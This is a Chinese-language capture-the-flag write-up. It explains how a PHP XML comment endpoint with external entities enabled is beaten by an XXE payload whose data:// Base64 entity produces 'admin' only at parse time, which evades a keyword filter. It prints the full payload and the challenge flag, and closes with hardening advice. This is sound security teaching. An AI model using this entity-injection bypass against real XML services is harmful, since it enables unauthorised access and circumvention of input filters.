# Comment

## 题目简述

题目给出一个接收 XML 评论数据的 PHP 接口。服务端重新启用了 libxml 的外部实体加载，并规定解析后的 `sender` 必须等于 `admin`，但原始 XML 字符串中又不能直接出现 `admin`。需要利用 XXE 与 PHP 的 `data://` 包装器，让解析器在处理实体时才生成目标字符串。

## 解题过程

源码开头执行了：

```php
libxml_disable_entity_loader(false);
```

flag 判断可化简为：

```php
if ($attrs->sender == 'admin' && !preg_match('/admin/i', $str)) {
    $flag = 'hgame{Pr3ud0~pr0t0c4l*m33ts_Xx3-!nj3cti0n~!}';
    $attrs->content = $flag;
}
```

直接写 `<sender>admin</sender>` 会命中对原始字符串 `$str` 的正则检查。解决办法是定义一个外部实体，其系统标识符指向 `data://text/plain;base64,...`。`admin` 的 Base64 编码是 `YWRtaW4=`，这个编码本身不包含被过滤的明文：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "data://text/plain;base64,YWRtaW4=">
]>
<comment>
  <sender>&xxe;</sender>
  <content>111</content>
</comment>
```

接口收到的原始数据里只有 `YWRtaW4=`，所以 `preg_match('/admin/i', $str)` 返回假；XML 解析器展开 `&xxe;` 时，PHP 的 `data://` 包装器才将 Base64 内容解码为 `admin`。于是解析后的 `$attrs->sender` 满足第一个条件，响应中的 `content` 被替换为：

```text
hgame{Pr3ud0~pr0t0c4l*m33ts_Xx3-!nj3cti0n~!}
```

## 方法总结

过滤原始序列化文本、验证解析后语义对象，是两个不同的安全层次。本题通过外部实体把敏感字符串推迟到解析阶段生成，从而制造了两层视图的不一致。修复时不应继续扩充关键字黑名单，而应关闭外部实体与网络访问，并在确有 XML 需求时使用禁止 DTD 的安全解析配置。
